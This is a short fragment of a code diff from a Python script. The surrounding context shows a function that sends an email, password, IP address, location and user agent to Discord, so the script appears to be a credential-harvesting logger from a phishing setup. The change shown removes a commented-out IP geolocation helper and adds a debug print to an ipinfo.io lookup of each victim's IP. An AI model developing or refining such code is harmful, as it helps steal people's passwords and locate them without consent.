@@ -20,22 +20,9 @@ def send_to_discord(email, password, ip, location_str, user_agent):
     except Exception as e:
         print(f"[ERROR] Failed to send log to Discord: {e}")
 
-
-# def get_location(ip):
-#     url = f"http://ip-api.com/json/{ip}"
-#     response = requests.get(url)
-#     if response.status_code == 200:
-#         data = response.json()
-#         return {
-#             "city": data.get("city"),
-#             "region": data.get("regionName"),
-#             "country": data.get("country"),
-#             "timezone": data.get("timezone"),
-#             "isp": data.get("isp")
-#         }
-
 def get_location(ip):
     response = requests.get(f"https://ipinfo.io/{ip}/json")
+    print(f"[DEBUG] IPInfo response for {ip}: {response.text}")
     if response.status_code == 200:
         data = response.json()
         return {
